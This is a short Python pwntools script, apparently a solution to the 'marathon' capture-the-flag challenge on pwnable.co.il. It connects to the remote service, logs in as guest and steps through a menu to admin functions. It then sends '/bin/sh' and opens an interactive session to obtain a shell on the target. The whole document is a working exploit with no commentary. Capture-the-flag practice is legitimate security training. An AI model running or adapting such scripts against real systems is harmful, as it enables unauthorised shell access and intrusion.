from pwn import *

#p = process("./marathon")
p = remote("pwnable.co.il", 9022)
p.sendline("1")
p.sendline("guest")
p.sendline("guest")
p.sendline("1")
p.sendline("admin")
p.sendline("a")
p.sendline("3")
p.sendline("/bin/sh")
p.interactive()
#print(p.recvall(timeout=1).decode()) 